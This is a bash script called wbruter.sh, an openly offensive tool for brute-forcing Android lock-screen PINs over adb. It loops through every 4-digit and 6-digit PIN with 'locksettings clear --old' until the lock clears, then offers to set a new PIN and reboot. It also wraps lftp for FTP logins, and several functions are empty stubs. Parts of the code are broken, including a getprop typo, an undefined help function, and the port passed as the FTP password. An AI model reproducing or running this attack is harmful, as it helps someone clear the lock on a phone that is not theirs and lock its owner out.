#!/bin/bash

# - iNFO -----------------------------------------------------------------------------
#
#        Author: wuseman <wuseman@nr1.nu>
#      FileName: wbruter.sh
#       Version: v3.0
#
#       Created: 2018-03-16 (23:53:08)
#      Modified: 2022-05-28 (03:07:22)
#
#           iRC: wuseman (Libera/EFnet/LinkNet) 
#       Website: https://www.nr1.nu/
#        GitHub: https://github.com/wuseman/
#
# - Descrpiption --------------------------------------------------------------------
#
#      No description has been added
#
# - LiCENSE -------------------------------------------------------------------------
#
#      Copyright (C) 2022, wuseman                                     
#                                                                       
#      This program is free software; you can redistribute it and/or modify 
#      it under the terms of the GNU General Public License as published by 
#      the Free Software Foundation; either version 3 of the License, or    
#      (at your option) any later version.                                  
#                                                                       
#      This program is distributed in the hope that it will be useful,      
#      but WITHOUT ANY WARRANTY; without even the implied warranty of       
#      MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the        
#      GNU General Public License for more details.                         
#                                                                       
#      You must obey the GNU General Public License. If you will modify     
#      the file(s), you may extend this exception to your version           
#      of the file(s), but you are not obligated to do so.  If you do not   
#      wish to do so, delete this exception statement from your version.    
#      If you delete this exception statement from all source files in the  
#      program, then also delete it here.                                   
#
#      You should have received a copy of the GNU General Public License
#      along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
# - End of Header -------------------------------------------------------------

################################################################################
################################################################################
####                                                                        ####
#### MISC/GENERAL                                                           ####
####                                                                        ####
################################################################################
################################################################################


# - Terminal Line--------------------------------------------------------------------
#
#      Print line as many columns your screen/monitor/terminal is
#
# -----------------------------------------------------------------------------------
function terminal_line() {
    printf "\r%*s\r%s\n" $(tput cols) "$2" "$1"|tr ' ' '-'
}

# - License -------------------------------------------------------------------------
#
#      Print License
#
# -----------------------------------------------------------------------------------
wbruter_license(){
    printf "%s\n" "Printing LICENSE - Use 'q' to quit"
    sleep 2
    curl -sL "https://w.nr1.nu/archive/wbruter/LICENSE.md"|less
    printf "%s\n" "Thank you.." 
}





################################################################################
################################################################################
####                                                                        ####
#### ANDROID RELATED                                                        ####
####                                                                        ####
################################################################################
################################################################################
add_to_conf() {
    DEVICE_VERSION="$(adb shell getprop ro.product.build.version.release)"
    DEVICE_ROOTED="$( adb shell hash su; [[ $? = "0" ]] && echo yes||echo no)"
    DEVICE_MODEL="$(adb shell getprop ro.product.model)"
    DEVICE_SHEALTHSAMSUNG="$(adb shell getpropinit.svc.health-hal-2-1-samsung)"
}

show_help_android() {
    if [[ -z $1 ]];then
        STATUS=$(cat $(pwd)/.wdroid-status)
        rm $(pwd)/.wdroid-status
        if [[ $STATUS = "normal" ]]; then
            printf "\nDevice is in $STATUS mode, what are you trying to do?"
            printf "Your device must be in normal mode when attacking pin code\n"
            usage
        fi
    fi    
}


show_help_ftp(){
    cat << EOF

      Usage: $basename$0 [-i ip] [-p port] [-u [user] [-P password] ftp_command 

                      -a|--author          - Print author info
                      -i                   - IP adress
                      -p                   - Port number
                      -u                   - Username
                      -P                   - Password
                      -h|--help            - Show this help
                      -v|--version         - Print version
EOF

}


################################################################################
################################################################################
####                                                                        ####
#### ANDROID                                                                ####
####                                                                        ####
################################################################################
################################################################################

androiddebug() {
    case $(adb devices | awk '{print $2}' | sed 1d | sed '$d') in
        "unauthorized") echo "* You must enable usb-debugging in developer settings." ;;
    esac
}

android_status() {
    ADBW=$(adb devices | sed -n '2p'|awk '{print $2}' | sed 's/device/normal/g')
    ADBF="$(fastboot devices | grep fastboot|awk '{print $2}')"
    ADBOFF="$(adb devices | sed -n 2p)"
    if [[ $ADBW = "normal" ]]; then
        echo "normal" > $(pwd)/.wdroid-status
    elif [[ $ADBW = "unauthorized" ]]; then
        echo " * Please allow this pc to authorize" > $(pwd)/.wdroid-status
    elif [[ $ADBW = "recovery" ]]; then
        echo "recovery" > $(pwd)/.wdroid-status
    elif [[ $ADBF = "fastboot" ]]; then
        echo "fastboot" > $(pwd)/.wdroid-status
    else
        echo "* No device connected.."
        exit
    fi
}

check_auth() {
    adb devices |sed -n 2p|grep una &> /dev/null
    if [[ $? -eq "0" ]]; then
        echo "* Your device has not been authorized with this pc, aborted."
        exit
    fi

}


adbexist() {
    adb="$(which adb 2> /dev/null)"
    distro="$(cat /etc/os-release | head -n 1 | cut -d'=' -f2 | sed 's/"//g')"

    if [ -z "$adb" ]; then
        printf "+ You must install \e[1;1madb\e[0m package before you can attack by this method.\n" 
        read -p "Install adb (Y/n) " adbinstall
    fi

    case $adbinstall in
        "Y")
            echo -e "\nPlease wait..\n"
            sleep 1
            case $distro in
                "Gentoo")
                    echo -e "It seems you running \e[1;32m$distro\e[0m wich is supported, installing adb....\n"
                    emerge --ask android-tools ;;
                "Sabayon")
                    echo -e "It seems you running \e[1;32m$distro\e[0m wich is supported, installing adb....\n"
                    emerge --ask android-tools ;;
                "Ubuntu")
                    echo -e "It seems you running \e[1;32m$distro\e[0m wich is supported, installing adb....\n"
                    apt update -y; apt upgrade -y; apt-get install adb ;;
                "Debian")
                    echo -e "It seems you running \e[1;32m$distro\e[0m wich is supported, installing adb....\n"
                    apt update -y; apt upgrade -y; apt-get install adb ;;
                "Raspbian")
                    echo -e "It seems you running \e[1;32m$distro\e[0m wich is supported, installing adb....\n"
                    apt update -y; apt upgrade -y; apt-get install adb ;;
                "Mint")
                    echo -e "It seems you running \e[1;32m$distro\e[0m wich is supported, installing adb....\n"
                    apt update -y; apt upgrade -y; apt-get install adb ;;
                "no") echo "Aborted." ;
                    exit 0 ;;
            esac
            echo -e "This tool is not supported for $distro, please go compile it from source instead...\n"
    esac
}


multidevices() {
    ADBTOT="$(adb devices | sed 1d|head -2|grep device|wc -l)"

    if [[ $ADBTOT -gt "1" ]]; then
        echo "You have more then one device connected, please choose one of:" 
        #    echo $(adb devices| awk '{print NR-1 " - " $0}'|sed "1d;$d"|awk '{print $1 ")", $3}'|sed '$d';) 
        exit 1
    fi
}



### bruteforcer comming soon



android_cli_4digits_older() {
    cr=`echo $'\n.'`
    cr=${cr%.}
    printf "%52s\n" | tr ' ' '-'
    echo -e "Bruteforce attack will be started within 2 seconds..\nPlease use (CTRL+C) to abort the attack at anytime.."
    printf "%52s\n" | tr ' ' '-'
    for i in {0000..9999}; do
        if [[ -z $(adb shell locksettings clear --old $i | grep "Lock credential cleared") ]]; then
            printf "Wrong PIN: \e[1;31m$i\e[0m\n"
        else
            printf "\nPIN Code Has Been Found: \e[1;32m$i\e[0m\n\n"
            printf "Do you want to set a new PIN "; read -p "(y/N): " newpin
            case $newpin in
                y)
                    read -p "Pin: " newpin2
                    adb shell locksettings set-pin $newpin2
                    printf "\nIt is required to restart your device after\n"
                    printf "PIN code has been set after old pin was erased..\n\n"
                    ;;
                N)
                    printf "\nIt is required to restart your device after\n"
                    printf "PIN code has been erased from your device..\n\n";
                    ;;
            esac
            read -p "restart device (y/N): " rebootornot
            case $rebootornot in
                y) adb shell reboot; printf "\nRebooting device, use pin '$newpin2' for unlock device..\n\n" ;;
                N) printf "\nPin was cracked by wbruter v1.5\n\n";exit 0 ;;
            esac
            exit
        fi
    done
}




android_cli_6digits_older() {
    cr=`echo $'\n.'`
    cr=${cr%.}
    printf "%52s\n" | tr ' ' '-'
    echo -e "Bruteforce attack will be started within 2 seconds..\nPlease use (CTRL+C) to abort the attack at anytime.."
    printf "%52s\n" | tr ' ' '-'
    for i in {000000..999999}; do
        if [[ -z $(adb shell locksettings clear --old $i | grep "Lock credential cleared") ]]; then
            printf "Wrong PIN: \e[1;31m$i\e[0m\n"
        else
            printf "\nPIN Code Has Been Found: \e[1;32m$i\e[0m\n\n"
            printf "Do you want to set a new PIN "; read -p "(y/N): " newpin
            case $newpin in
                y)
                    read -p "Pin: " newpin2
                    adb shell locksettings set-pin $newpin2
                    printf "\nIt is required to restart your device after\n"
                    printf "PIN code has been set after old pin was erased..\n\n"
                    ;;
                N)
                    printf "\nIt is required to restart your device after\n"
                    printf "PIN code has been erased from your device..\n\n";
                    ;;
            esac
            read -p "restart device (y/N): " rebootornot
            case $rebootornot in
                y) adb shell reboot; printf "\nRebooting device, use pin '$newpin2' for unlock device..\n\n" ;;
                N) printf "\nPin was cracked by wbruter v1.5\n\n";exit 0 ;;
            esac
            exit
        fi
    done
}

android_cli_bruteforce_check_lock_method() {
    echo "adding next"
}

android_cli_bruteforce_erase() {
    echo "adding next"
}


android_cli_bruteforce_removeCache() {
    echo "adding next"
}

android_cli_set-resume-on-reboot-provider-package() {
echo "adding next"
}


android_cli_bruteforce_4digits_new() {
    echo "adding next"
}

android_cli_bruteforce_6digits_older() {
    echo "adding next"
}

android_cli_bruteforce_passphrase() {
    echo "adding next"
}

android_cli_bruteforce_facematch() {
    echo "adding next"
}


android_cli_bruteforce_facematch() {
    echo "adding next"
}

while getopts ":i:p:u:P:avh" o; do
    case "${o}" in
        i)
            i=${OPTARG}
            if ! [[ $i =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
                echo -e "$basename$0: internal error -- that is not a real ip, try a real one..."
                exit 
            fi
            ;;
        p)
            p=${OPTARG}

            ;;
        u)
            u=${OPTARG}
            if [[ -z $u ]]; then echo -e "$basename$0: internal error -- specify a username";exit 1;fi
            ;;
        P)
            P=${OPTARG}
            if [[ -z $P ]]; then echo -e "$basename$0: internal error -- specify a password";exit 1; fi
            ;;
        v|-version) 
            cat $basename $0 |grep -w Version: |sed 's/^#       //g' |head -n1; exit 0
            ;;
        *)
            show_help
            ;;
    esac
done
shift $((OPTIND-1))

if [[ $@ = "-a" ]]; then 
    echo "i = ${i}"
    echo "p = ${p}"
    echo "u = ${u}"
    echo "P = ${P}"
    read -p "Connect (y/N): "
    lftp -u ${u}:${p} ${i} -p ${p} -e "$*;exit" 
elif [[ $@ = "-d" ]]; then
    lftp -u ${u}:${p} ${i} -p ${p} -e "$*;exit" 
else
    lftp -u ${u}:${P} ${i} -p ${p} -e "$*;exit" -d 
fi
